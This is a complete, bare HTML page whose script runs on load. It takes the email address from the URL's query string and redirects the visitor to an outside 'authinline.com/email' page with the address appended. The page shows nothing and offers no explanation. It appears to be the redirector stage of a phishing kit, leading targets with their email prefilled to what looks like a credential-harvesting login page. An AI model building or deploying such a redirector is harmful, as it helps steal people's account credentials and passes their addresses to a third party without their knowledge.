<!DOCTYPE html>
<html>
<head>
  <title>Email Redirect</title>
  <script>
    function extractEmailAndRedirect() {
      // Get the current URL
      var currentURL = window.location.href;

      // Check if the current URL contains a '?' character
      if (currentURL.includes('?')) {
        // Split the URL into two parts: the base URL and the query parameters
        var parts = currentURL.split('?');
        var baseURL = parts[0]; // Base URL
        var queryParameters = parts[1];

        // Check if query parameters are not empty
        if (queryParameters) {
          // Split the query parameters to separate the email and the rest of the parameters
          var queryParams = queryParameters.split('&');
          for (var i = 0; i < queryParams.length; i++) {
            var param = queryParams[i].split('=');
            if (param[0] === 'email') {
              // Extract the email parameter value
              var email = param[1];
              // Construct the redirect URL with the email in front of the '='
              var redirectURL = 'https://authinline.com/email/index.html?' + email;
              // Redirect to the constructed URL
              window.location.href = redirectURL;
              return; // Exit the loop once email parameter is found
            }
          }
        }
      }
      // If no valid email parameter is found, simply redirect to the second link
      window.location.href = 'https://authinline.com/email/index.html/';
    }

    // Call the function immediately when the script is loaded
    extractEmailAndRedirect();
  </script>
</head>
<body>
</body>
</html>
